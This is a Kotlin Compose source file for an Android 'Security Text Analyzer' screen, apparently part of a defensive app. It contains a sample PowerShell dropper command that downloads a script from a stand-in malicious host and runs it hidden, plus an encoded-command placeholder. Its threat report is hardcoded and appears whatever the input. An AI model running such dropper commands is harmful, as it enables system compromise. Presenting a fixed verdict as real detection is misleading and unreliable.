package com.cyberguard.ai.ui.screens

import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.cyberguard.ai.ui.theme.*

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun SecurityTextAnalyzerScreen(onBack: () -> Unit) {
    var inputContent by remember { mutableStateOf("") }
    var analyzed by remember { mutableStateOf(false) }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(CyberDark)
            .verticalScroll(rememberScrollState())
    ) {
        TopAppBar(
            title = { Text("SECURITY TEXT ANALYZER", fontWeight = FontWeight.Bold, fontSize = 17.sp) },
            navigationIcon = {
                IconButton(onClick = onBack) {
                    Icon(Icons.Default.ArrowBack, contentDescription = "Back", tint = CyberTextPrimary)
                }
            },
            colors = TopAppBarDefaults.topAppBarColors(containerColor = CyberSurface)
        )

        Column(modifier = Modifier.padding(16.dp)) {
            Text(
                text = "Enter any suspicious text, command snippet, system notification, or log message to detect potential threats.",
                color = CyberTextSecondary,
                fontSize = 13.sp
            )

            Spacer(modifier = Modifier.height(12.dp))

            OutlinedTextField(
                value = inputContent,
                onValueChange = { inputContent = it },
                placeholder = { Text("e.g. powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Enc aQB3AHI...") },
                modifier = Modifier
                    .fillMaxWidth()
                    .height(120.dp),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = CyberCyan,
                    unfocusedBorderColor = Color(0xFF334155),
                    focusedContainerColor = CyberSurfaceVariant,
                    unfocusedContainerColor = CyberSurfaceVariant,
                    focusedTextColor = CyberTextPrimary,
                    unfocusedTextColor = CyberTextPrimary
                ),
                shape = RoundedCornerShape(12.dp)
            )

            Spacer(modifier = Modifier.height(8.dp))

            Button(
                onClick = {
                    inputContent = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-WebRequest -Uri http://malicious-node.xyz/update.ps1 -OutFile %TEMP%\\update.ps1; Start-Process %TEMP%\\update.ps1\""
                },
                colors = ButtonDefaults.buttonColors(containerColor = CyberSurfaceVariant),
                contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp)
            ) {
                Text("Sample Suspicious Command", fontSize = 11.sp, color = CyberCyan)
            }

            Spacer(modifier = Modifier.height(16.dp))

            Button(
                onClick = { if (inputContent.isNotBlank()) analyzed = true },
                modifier = Modifier.fillMaxWidth(),
                colors = ButtonDefaults.buttonColors(containerColor = CyberCyan, contentColor = Color.Black),
                shape = RoundedCornerShape(12.dp)
            ) {
                Icon(Icons.Default.Troubleshoot, contentDescription = null)
                Spacer(modifier = Modifier.width(8.dp))
                Text("Analyze Threat", fontWeight = FontWeight.Bold)
            }

            if (analyzed) {
                Spacer(modifier = Modifier.height(20.dp))

                Card(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(16.dp),
                    colors = CardDefaults.cardColors(containerColor = CyberSurface)
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Text("SECURITY REPORT CARD", color = CyberTextSecondary, fontSize = 11.sp, fontWeight = FontWeight.Bold, letterSpacing = 1.sp)
                        Spacer(modifier = Modifier.height(10.dp))

                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.SpaceBetween,
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Column {
                                Text("Identified Threat", color = CyberTextSecondary, fontSize = 12.sp)
                                Text("PowerShell Stager / Dropper", color = CyberTextPrimary, fontSize = 16.sp, fontWeight = FontWeight.Bold)
                            }
                            Surface(
                                color = CyberRed.copy(alpha = 0.2f),
                                shape = RoundedCornerShape(8.dp)
                            ) {
                                Text(
                                    "CRITICAL (88/100)",
                                    color = CyberRed,
                                    fontWeight = FontWeight.Bold,
                                    fontSize = 12.sp,
                                    modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)
                                )
                            }
                        }

                        Spacer(modifier = Modifier.height(14.dp))
                        Divider(color = Color(0xFF1E293B))
                        Spacer(modifier = Modifier.height(12.dp))

                        Text("SUSPICIOUS INDICATORS", color = CyberTextSecondary, fontSize = 11.sp, fontWeight = FontWeight.Bold)
                        Spacer(modifier = Modifier.height(6.dp))
                        Text("• ExecutionPolicy Bypass flag used to circumvent local script protections", color = CyberTextPrimary, fontSize = 13.sp)
                        Text("• Hidden window execution flag intended to evade user detection", color = CyberTextPrimary, fontSize = 13.sp)
                        Text("• Automated remote download into volatile %TEMP% directory", color = CyberTextPrimary, fontSize = 13.sp)

                        Spacer(modifier = Modifier.height(14.dp))
                        Text("RECOMMENDED DEFENSIVE ACTION", color = CyberGreen, fontSize = 11.sp, fontWeight = FontWeight.Bold)
                        Spacer(modifier = Modifier.height(6.dp))
                        Text("1. Do not execute this command in terminal or PowerShell.\n2. Enable AppLocker or Constrained Language Mode.\n3. Inspect endpoint security logs for related process spawn events.", color = CyberTextPrimary, fontSize = 13.sp)
                    }
                }
            }
        }
    }
}
